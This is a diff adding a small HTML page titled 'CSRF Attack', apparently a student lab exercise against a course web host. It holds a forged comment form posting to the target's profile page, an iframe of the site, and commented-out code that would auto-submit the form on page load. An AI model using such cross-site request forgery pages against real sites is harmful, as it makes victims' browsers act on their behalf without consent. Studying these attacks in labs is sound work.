@@ -1,0 +1,48 @@
+<html>
+<head>
+    <title>CSRF Attack</title>
+    <script>
+
+window.onload = function() {
+    //document.getElementById("myForm").submit();
+    //var xhr = new XMLHttpRequest();
+    //xhr.open("GET", "http://xzhan141.hotelcit.com/profile.php?id=12");
+    //xhr.onload = function(event){
+    //alert("Success, server responded with: " + event.target.response); // raw response
+//};
+    //var vars = {};
+    //var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+    //    vars[key] = value;
+    //});
+    //for (let [key, value] of Object.entries(vars)) {
+    //    console.log(`${key}: ${value}`);
+    //}
+    //const Http = new XMLHttpRequest();
+    //const url='http://localhost:4000/';
+    //Http.open("GET", url);
+    //Http.send();
+    //
+    //Http.onreadystatechange = (e) => {
+    //  console.log(Http.responseText)
+    //}
+    var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        alert(xhr.responseText);
+    }
+}
+xhr.open('GET', 'https://www.google.com', true);
+xhr.send(null);
+}
+
+    </script>
+</head>
+
+<body>
+    <form action="http://xzhan141.hotelcit.com/profile.php?id=12" method="post" style="margin-top:20px" id="myForm">
+		<textarea rows="4" name="comment" placeholder="hello, this is CSRF Attack!" type="hidden">Hello, this is CSRF Attack!</textarea>
+		<input type="submit" value="COMMENT" style="margin-left: auto; margin-right: auto;">
+	</form>
+    <iframe src="http://xzhan141.hotelcit.com/main.php"><iframe>
+</body>
+</html
